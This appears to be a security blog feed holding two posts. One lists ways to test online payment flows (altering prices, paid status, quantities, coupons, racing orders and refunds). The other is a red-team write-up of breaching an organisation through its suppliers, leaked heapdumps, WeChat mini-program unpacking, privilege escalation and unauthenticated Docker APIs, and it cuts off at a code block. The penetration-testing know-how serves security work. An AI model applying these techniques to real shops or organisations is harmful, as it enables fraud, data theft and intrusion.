    <a href="#%e4%b8%80%e6%9b%b4%e6%94%b9%e6%94%af%e4%bb%98%e9%87%91%e9%a2%9d" class="header-mark"></a>一、更改支付金额</h4><p>在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f3574934b2709537f1827cfb7dd40ab1ea22aa6595a14.jpg" title="image-20240110144659185" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f3574934b2709537f1827cfb7dd40ab1ea22aa6595a14.jpg">
        
    </a></p>
<h4 id="二更改支付状态" class="headerLink">
    <a href="#%e4%ba%8c%e6%9b%b4%e6%94%b9%e6%94%af%e4%bb%98%e7%8a%b6%e6%80%81" class="header-mark"></a>二、更改支付状态</h4><p>在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。</p>
<p>1、直接修改为已支付状态</p>
<p>2、修改未支付的订单号为已支付订单号</p>
<h4 id="三修改支付类型" class="headerLink">
    <a href="#%e4%b8%89%e4%bf%ae%e6%94%b9%e6%94%af%e4%bb%98%e7%b1%bb%e5%9e%8b" class="header-mark"></a>三、修改支付类型</h4><p>通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f8945932b8f23aef9c041ae46ed705411e63daeb869fc.jpg" title="image-20240109155239418" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f8945932b8f23aef9c041ae46ed705411e63daeb869fc.jpg">
        
    </a></p>
<h4 id="四更改订单信息" class="headerLink">
    <a href="#%e5%9b%9b%e6%9b%b4%e6%94%b9%e8%ae%a2%e5%8d%95%e4%bf%a1%e6%81%af" class="header-mark"></a>四、更改订单信息</h4><p>服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。</p>
<p>常见位置在生成订单、生成支付链接等。</p>
<p>1、修改商品编号</p>
<p>直接在生成的订单中替换商品编号。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f87753788ed288f74f10e348d434695a4fdff6371921b.jpg" title="image-20240110101427801" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f87753788ed288f74f10e348d434695a4fdff6371921b.jpg">
        
    </a></p>
<p>2、修改订单号</p>
<p>将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f1269092cb6d7051c8328597a394b762ac701acf79516.jpg" title="image-20240110103259992" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f1269092cb6d7051c8328597a394b762ac701acf79516.jpg">
        
    </a></p>
<p>3、越权使用他人优惠券、越权使用他人积分等</p>
<h4 id="五更改数量实现优惠支付" class="headerLink">
    <a href="#%e4%ba%94%e6%9b%b4%e6%94%b9%e6%95%b0%e9%87%8f%e5%ae%9e%e7%8e%b0%e4%bc%98%e6%83%a0%e6%94%af%e4%bb%98" class="header-mark"></a>五、更改数量实现优惠支付</h4><p>支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。</p>
<p>1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f854767372d569d88ea1b9229694af14db7b2bfc4fe91.jpg" title="image-20240109160656541" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f854767372d569d88ea1b9229694af14db7b2bfc4fe91.jpg">
        
    </a></p>
<p>2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格）</p>
<p>生成订单时有参数表示商品数量，修改为-1</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f877676e7a3b21b94567d09d0775f8ff299fcee360481.jpg" title="image-20240110114704324" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f877676e7a3b21b94567d09d0775f8ff299fcee360481.jpg">
        
    </a></p>
<p>修改数量为-1后会发现，此时金额为负数。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f41642026e77e358c0be29d427ef2d4fe9344144b7df5.jpg" title="image-20240110114800810" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f41642026e77e358c0be29d427ef2d4fe9344144b7df5.jpg">
        
    </a></p>
<p>在提交订单支付的时候，为保证支付成功需要修改金额。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f4865593451df8607a8a168c3156aa3217a7ba6f2ff04.jpg" title="image-20240110115204600" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f4865593451df8607a8a168c3156aa3217a7ba6f2ff04.jpg">
        
    </a></p>
<p>3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购</p>
<p>在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。</p>
<p>同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f668754bdebe029b91efb8912fdcf4f6ded373335e293.jpg" title="image-20240110154805679" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f668754bdebe029b91efb8912fdcf4f6ded373335e293.jpg">
        
    </a></p>
<p>4、手动增加订单中商品相关的多个参数以达到少付多买的目的。</p>
<p>有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f2753175001cbfd29afc6630cafec90ad772e024359c3.jpg" title="image-20240110152818004" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f2753175001cbfd29afc6630cafec90ad772e024359c3.jpg">
        
    </a></p>
<p>尝试在提交订单的时候多添加几个此类参数</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f628227c8dd980d623a6f0b5c5986aeadd3af217fe0b8.jpg" title="image-20240110153021212" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f628227c8dd980d623a6f0b5c5986aeadd3af217fe0b8.jpg">
        
    </a><br>
提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f584594b46a54c736a47f51a93d8c30a32c89937450af.jpg" title="image-20240110153517777" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f584594b46a54c736a47f51a93d8c30a32c89937450af.jpg">
        
    </a></p>
<h4 id="六重复支付突破限购" class="headerLink">
    <a href="#%e5%85%ad%e9%87%8d%e5%a4%8d%e6%94%af%e4%bb%98%e7%aa%81%e7%a0%b4%e9%99%90%e8%b4%ad" class="header-mark"></a>六、重复支付，突破限购</h4><p>在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。</p>
<p>并发订单，多台设备同时提交优惠订单。</p>
<p>常见于限购，一个账号仅许购买一次等</p>
<p>1、限制一个优惠订单时直接并发生成多个优惠订单</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f9371130d8e1ec7ff621f551c5922822dcd08fa505b00.jpg" title="image-20240110143709606" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f9371130d8e1ec7ff621f551c5922822dcd08fa505b00.jpg">
        
    </a></p>
<p>2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单</p>
<p>常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。</p>
<p>3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。</p>
<h4 id="七优惠券多次使用" class="headerLink">
    <a href="#%e4%b8%83%e4%bc%98%e6%83%a0%e5%88%b8%e5%a4%9a%e6%ac%a1%e4%bd%bf%e7%94%a8" class="header-mark"></a>七、优惠券多次使用</h4><p>常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。</p>
<p>1、在一个订单中叠加使用优惠券</p>
<p>2、修改优惠券标识，尝试使用其他商品中的大额优惠券</p>
<p>3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。</p>
<h4 id="八遍历隐藏或者下架优惠id获取优惠链接" class="headerLink">
    <a href="#%e5%85%ab%e9%81%8d%e5%8e%86%e9%9a%90%e8%97%8f%e6%88%96%e8%80%85%e4%b8%8b%e6%9e%b6%e4%bc%98%e6%83%a0id%e8%8e%b7%e5%8f%96%e4%bc%98%e6%83%a0%e9%93%be%e6%8e%a5" class="header-mark"></a>八、遍历隐藏或者下架优惠id获取优惠链接</h4><p>漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等）</p>
<p>1、遍历隐藏优惠券</p>
<p>一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。</p>
<p>2、遍历商品id从而fuzz到已下架的商品</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f201795a3e30d18032dd11cc87b0edeb8ddb2c1f378be.jpg" title="image-20240109171142727" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f201795a3e30d18032dd11cc87b0edeb8ddb2c1f378be.jpg">
        
    </a></p>
<h4 id="九利用小数点精度四舍五入" class="headerLink">
    <a href="#%e4%b9%9d%e5%88%a9%e7%94%a8%e5%b0%8f%e6%95%b0%e7%82%b9%e7%b2%be%e5%ba%a6%e5%9b%9b%e8%88%8d%e4%ba%94%e5%85%a5" class="header-mark"></a>九、利用小数点精度四舍五入</h4><p>0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。</p>]]></description>
</item><item>
    <title>攻防实战外网突破</title>
    <link>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
    <pubDate>Sun, 11 Feb 2024 18:24:29 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2442" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2442</a></em></p>
</blockquote>
<p>在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板&hellip;</p>
<h2 id="1供应链" class="headerLink">
    <a href="#1%e4%be%9b%e5%ba%94%e9%93%be" class="header-mark"></a>1、供应链</h2><p>在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板效应，一处出现短板，整个防护体系就可能瞬间崩溃。而目标单位的供应链往往是这些薄弱点的集中体现。这些供应链不仅暴露在外，而且由于复杂的关系，使得对它们的监控和管理变得更为困难。因此，攻击团队通常会选择从供应链着手，以一种迂回的方式绕过目标单位强大的防御体系，获得对目标单位的控制权限。</p>
<p>通过在搜索引擎上搜索&quot;系统名称&quot;目标单位</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png">
        
    </a><br>
找到相关的供应商信息，通过对供应商进行攻击，获取目标单位的数据及权限。!</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-06c417df425049e840d6fc969931aea2c57abc86.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-06c417df425049e840d6fc969931aea2c57abc86.png">
        
    </a></p>
<h2 id="11heapdump泄露" class="headerLink">
    <a href="#11heapdump%e6%b3%84%e9%9c%b2" class="header-mark"></a>1.1、heapdump泄露</h2><p>通过对供应商资产进行渗透，发现某资产admin目录下存在heapdump文件泄露</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png">
        
    </a></p>
<p>对于heapdump的利用方式这里就不太赘述，有许多文章对其原理和利用都进行了深入的研究，特定情况下还可以直接进行RCE，这里泄露了大量敏感信息，密码信息加入密码本</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-66928849da0ca5930c02525ce43efa892d6b634a.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-66928849da0ca5930c02525ce43efa892d6b634a.png">
        
    </a></p>
<p>登录MinIO，发现大量所属目标单位的敏感信息，也存在其它单位的敏感信息</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c1f383551c52acd3ee64b926f7d93fd9c137aef3.png">
        
    </a></p>
<p>登录Nacos，大量配置文件，密码信息加入密码本![]</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ac9cf0350376d0bdad40573ddba38eb4c5506cbd.png">
        
    </a><br>
登录OSS，发现大量所属目标单位的敏感信息</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-19969a44c514fa8ba5769db3cad69ee31c3e5997.png">
        
    </a></p>
<h2 id="12微信小程序接口未授权" class="headerLink">
    <a href="#12%e5%be%ae%e4%bf%a1%e5%b0%8f%e7%a8%8b%e5%ba%8f%e6%8e%a5%e5%8f%a3%e6%9c%aa%e6%8e%88%e6%9d%83" class="header-mark"></a>1.2、微信小程序接口未授权</h2><h3 id="121微信小程序解包" class="headerLink">
    <a href="#121%e5%be%ae%e4%bf%a1%e5%b0%8f%e7%a8%8b%e5%ba%8f%e8%a7%a3%e5%8c%85" class="header-mark"></a>1.2.1、微信小程序解包</h3><p>想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作。</p>
<h4 id="1211获取wxapkg文件" class="headerLink">
    <a href="#1211%e8%8e%b7%e5%8f%96wxapkg%e6%96%87%e4%bb%b6" class="header-mark"></a>1.2.1.1、获取wxapkg文件</h4><p>在获取wxapkg文件时，最好将文件夹中的文件先删除，然后再重新打开小程序，防止其它文件干扰</p>
<p>iOS wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">mobile</span><span class="o">/</span><span class="nx">Containers</span><span class="o">/</span><span class="nx">Data</span><span class="o">/</span><span class="nx">Application</span><span class="o">/</span><span class="p">{</span><span class="nx">系统UUID</span><span class="p">}</span><span class="o">/</span><span class="nx">Library</span><span class="o">/</span><span class="nx">WechatPrivate</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">WeApp</span><span class="o">/</span><span class="nx">LocalCache</span><span class="o">/</span><span class="nx">release</span><span class="o">/</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Android wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">com</span><span class="o">.</span><span class="nx">tencent</span><span class="o">.</span><span class="nx">mm</span><span class="o">/</span><span class="nx">MicroMsg</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">appbrand</span><span class="o">/</span><span class="nx">pkg</span><span class="o">/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Windows wxapkg 文件存放路径为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\</span><span class="p">{</span><span class="nx">系统用户名</span><span class="p">}</span><span class="nx">\Documents\WeChat</span> <span class="nx">Files\Applet\</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span><span class="nx">\</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c07cd9ddd04c8648c9c91b6f299567c0b72b41ad.png">
        
    </a></p>
<h4 id="1212解密操作" class="headerLink">
    <a href="#1212%e8%a7%a3%e5%af%86%e6%93%8d%e4%bd%9c" class="header-mark"></a>1.2.1.2、解密操作</h4><p>下面两个github项目都可以进行解密操作</p>
<p><a href="https://github.com/superdashu/pc_wxapkg_decrypt_python" target="_blank" rel="noopener noreferrer">https://github.com/superdashu/pc_wxapkg_decrypt_python</a><br>
<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt" target="_blank" rel="noopener noreferrer">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></p>
<p>解密原理</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-d27d47fad9d778623595d826710881eb124d9568.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-d27d47fad9d778623595d826710881eb124d9568.png">
        
    </a><br>
成功解密</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cf8e0087265e9df8bccd324c23b00b2c999208a3.png">
        
    </a></p>
<h4 id="1212解包操作" class="headerLink">
    <a href="#1212%e8%a7%a3%e5%8c%85%e6%93%8d%e4%bd%9c" class="header-mark"></a>1.2.1.2、解包操作</h4><p>国光大佬提供的工具下载链接</p>
<p><a href="https://sqlsec.lanzoub.com/i1NEP0mx694f" target="_blank" rel="noopener noreferrer">https://sqlsec.lanzoub.com/i1NEP0mx694f</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">node</span> <span class="nx">wuWxapkg</span><span class="o">.</span><span class="nx">js</span> <span class="mf">1.</span><span class="nx">wxapkg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-34059d3982e40191688ff91a62ff887f20664ed1.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-34059d3982e40191688ff91a62ff887f20664ed1.png">
        
    </a></p>
<p>对小程序进行解包操作，获取到前端JS代码后中，从中进行提取获得接口</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9d445cec5aa86f847adfa0539ce14de6d811fcbc.png">
        
    </a></p>
<p>直接访问目标接口，前端页面虽然显示初始化失败</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-15d32eb56abb7ade12e2457bf0e2831eff541cee.png">
        
    </a><br>
但流量包中已获取数据，近千万条目标单位敏感信息</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-54eca16fac67d0a5ee4681bb3fd48aa33c55adb5.png">
        
    </a></p>
<h2 id="13web程序越权" class="headerLink">
    <a href="#13web%e7%a8%8b%e5%ba%8f%e8%b6%8a%e6%9d%83" class="header-mark"></a>1.3、web程序越权</h2><p>通过上述收集到的密码，撞密码撞出一个账号，但是此账号为最低权限，无任何操作权限，点击搜索组织架构，此时无任何返回信息<br>
<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-13aebe0c150b3a80913a78bea00857172d90edd8.png">
        
    </a></p>
<p>抓包将parentId和orgLevel去除，再发包，即可越权看到全员组织架构</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-eaaa24aec2cd0aaffcba0cb30c7867bba9e0f61d.png">
        
    </a></p>
<p>点击修改密码，然后将上述获取到的roleId添加进去，即可获取全部权限</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-766adde7cecebb3b8aa309fd163c508dd0cc9197.png">
        
    </a></p>
<p>获取到大量数据</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-aaceb387674ff04511482b780b03369902094232.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-aaceb387674ff04511482b780b03369902094232.png">
        
    </a></p>
<h2 id="14公众号" class="headerLink">
    <a href="#14%e5%85%ac%e4%bc%97%e5%8f%b7" class="header-mark"></a>1.4、公众号</h2><p>js泄露密码，密码可撞库目标单位公众号</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png">
        
    </a></p>
<h2 id="2云原生安全" class="headerLink">
    <a href="#2%e4%ba%91%e5%8e%9f%e7%94%9f%e5%ae%89%e5%85%a8" class="header-mark"></a>2、云原生安全</h2><p>容器化部署和微服务架构为应用程序开发和部署提供了更好的灵活性、可伸缩性、可维护性和性能，受到了越来越多厂商的使用，新的应用就会引入新的攻击面，如容器逃逸、服务间攻击、API滥用等。攻击者可以利用这些新的入口点来攻击应用程序和数据。并且在云原生环境下管理用户和服务的身份验证和授权变得更加复杂。许多应用开发商在追求容器化和云原生架构的便利性和效率时，安全性常常被忽视或放在次要位置。这就直接导致了云原生环境的脆弱，容易受到各种安全威胁和攻击。</p>
<h2 id="21harbor-镜像仓库" class="headerLink">
    <a href="#21harbor-%e9%95%9c%e5%83%8f%e4%bb%93%e5%ba%93" class="header-mark"></a>2.1、Harbor 镜像仓库</h2><p>Harbor是一个开源的容器镜像仓库管理器，旨在帮助组织存储、管理和分发Docker容器镜像，但是Harbor存在一个充满争议的“漏洞”：任意用户能够直接获取public的镜像。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png">
        
    </a></p>
<p>可以直接拉取下载镜像文件，可以利用脚本批量下载</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png">
        
    </a></p>
<h2 id="22疑似后门" class="headerLink">
    <a href="#22%e7%96%91%e4%bc%bc%e5%90%8e%e9%97%a8" class="header-mark"></a>2.2、疑似后门</h2><p>通过镜像文件获取jar包，获取配置文件等敏感信息，对jar包的class文件进行反编译，进行代码审计获取到一个类似后门的漏洞，该接口只需要使用用户名，即可登录系统后台。管理员权限配合文件上传获取服务器权限。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png">
        
    </a></p>
<p>通过配置文件连接数据库等</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png">
        
    </a></p>
<h2 id="23docker未授权" class="headerLink">
    <a href="#23docker%e6%9c%aa%e6%8e%88%e6%9d%83" class="header-mark"></a>2.3、docker未授权</h2><h3 id="231-registry-api未授权访问" class="headerLink">
    <a href="#231-registry-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>2.3.1、 registry api未授权访问</h3><p>在 Docker Registry API 中，认证和授权通常是基于访问令牌（Access Token）或者用户名和密码的。如果未正确设置访问控制权限，即会造成未授权访问漏洞，攻击者可直接下载registry仓库的所有镜像容器。</p>
<p>访问/v2/_catalog接口即可查看全部仓库内容</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png">
        
    </a><br>
<a href="https://github.com/Soufaker/docker_v2_catalog" target="_blank" rel="noopener noreferrer">https://github.com/Soufaker/docker_v2_catalog</a></p>
<p>利用上述工具可直接下载镜像</p>
<h3 id="232-docker-remote-api未授权访问" class="headerLink">
    <a href="#232-docker-remote-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>2.3.2、 Docker Remote API未授权访问</h3><p>为了管理容器集群，Docker允许Daemon作为后台守护进程执行通过管理接口发送的Docker命令，使用参数-H 0.0.0.0:2375启动Docker Daemon时，将开放2375端口接收来自远程Docker客户端的命令。在这种情况下，2375端口被作为非加密端口暴露出来，并且不存在任何形式的身份验证，攻击者可以直接使用Docker命令连接到Docker Daemon，并对容器进行直接操作，配合根目录挂载即可实现容器逃逸。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
